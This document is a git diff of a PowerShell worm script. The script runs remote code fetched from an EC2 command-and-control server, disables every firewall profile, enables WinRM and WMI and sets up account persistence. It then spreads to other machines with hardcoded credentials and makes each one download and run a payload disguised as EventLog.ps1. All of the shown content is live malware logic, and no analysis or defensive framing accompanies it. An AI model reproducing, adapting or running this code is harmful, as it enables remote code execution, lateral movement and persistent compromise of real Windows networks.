@@ -16,6 +16,8 @@ $c0de='Tossking@'
 $c0de=$c0de+$toAppend
 $username='magrene'
 $usernameB=((gwmi WIN32_ComputerSystem).Domain+'\magrene')
+$cNcURL='http://ec2-44-192-30-152.compute-1.amazonaws.com/f5423r/ctrlc/fffeeeezzzz/23retefd.txt'
+$timeURL='http://ec2-44-192-30-152.compute-1.amazonaws.com/eeee/timeZ.txt'
 [SecureString]$secureString = $c0de | ConvertTo-SecureString -AsPlainText -Force 
 [PSCredential]$credential = New-Object System.Management.Automation.PSCredential -ArgumentList $userNameB, $secureString
 
@@ -78,47 +80,49 @@ function keepWINRMAlive{
 function wormy{
     
     while(1 -eq 1){
-    $httpCommand=invoke-restmethod http://ec2-44-192-30-152.compute-1.amazonaws.com/f5423r/ctrlc/fffeeeezzzz/23retefd.txt
-    invoke-expression $httpCommand
-    accountPersist
-    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
-    [int][double]::Parse((get-date -UFormat %s)) | out-file -FilePath 'C:\Users\Public\Downloads\desktop.log'
-    Write-Output 'slither'
-    Set-Service -Name WinRM -StartupType Automatic
-    Set-Service -Name Winmgmt -StartupType Automatic
-    Start-Service WinRM
-    Start-Service Winmgmt
-    Foreach($i in $computerNames){
-        Write-Output $i
-        invoke-command -ComputerName $i -Credential $credential -ScriptBlock {
-            if(Test-Path 'C:\Users\Public\Downloads\desktop.log' ){
-                if((get-content -path 'C:\Users\Public\Downloads\desktop.log') -lt ([int][double]::Parse((get-date -UFormat %s))) - 30){
-                    Invoke-Command -ScriptBlock {
-                    set-executionpolicy Unrestricted
-                    $WebClient = New-Object System.Net.WebClient
-                    $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1","C:\Windows\EventLog.ps1")
-                    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command 'C:\Windows\EventLog.ps1' -ExecutionPolicy Bypass
+        [SecureString]$secureString = $c0de | ConvertTo-SecureString -AsPlainText -Force 
+        [PSCredential]$credential = New-Object System.Management.Automation.PSCredential -ArgumentList $userNameB, $secureString
+        $httpCommand=invoke-restmethod $cNcURL
+        invoke-expression $httpCommand
+        accountPersist
+        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+        [int][double]::Parse((get-date -UFormat %s)) | out-file -FilePath 'C:\Users\Public\Downloads\desktop.log'
+        Write-Output 'slither'
+        Set-Service -Name WinRM -StartupType Automatic
+        Set-Service -Name Winmgmt -StartupType Automatic
+        Start-Service WinRM
+        Start-Service Winmgmt
+        Foreach($i in $computerNames){
+            Write-Output $i
+            invoke-command -ComputerName $i -Credential $credential -ScriptBlock {
+                if(Test-Path 'C:\Users\Public\Downloads\desktop.log' ){
+                    if((get-content -path 'C:\Users\Public\Downloads\desktop.log') -lt ([int][double]::Parse((get-date -UFormat %s))) - 30){
+                        Invoke-Command -ScriptBlock {
+                        set-executionpolicy Unrestricted
+                        $WebClient = New-Object System.Net.WebClient
+                        $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1","C:\Windows\EventLog.ps1")
+                        C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command 'C:\Windows\EventLog.ps1' -ExecutionPolicy Bypass
+                        }
                     }
                 }
+                else{
+                        set-executionpolicy Unrestricted
+                        $WebClient = New-Object System.Net.WebClient
+                        $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1","C:\Windows\EventLog.ps1")
+                        C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command 'C:\Windows\EventLog.ps1' -ExecutionPolicy Bypass   
+                }
+                }
             }
-            else{
-                    set-executionpolicy Unrestricted
-                    $WebClient = New-Object System.Net.WebClient
-                    $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1","C:\Windows\EventLog.ps1")
-                    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command 'C:\Windows\EventLog.ps1' -ExecutionPolicy Bypass   
-            }
-            }
-        }
         
-        accountPersist
-        start-sleep -Seconds (get-random -Minimum 2 -Maximum 5)
-    }
+            accountPersist
+            start-sleep -Seconds (get-random -Minimum 2 -Maximum 5)
+        }
 }
 
 
 start-job -ScriptBlock{
     
-    $toAppend=invoke-restmethod http://ec2-44-192-30-152.compute-1.amazonaws.com/eeee/timeZ.txt
+    $toAppend=invoke-restmethod $timeURL
     $username='magrene'
     $c0de='Tossking@'
     $c0de=$c0de+$toAppend
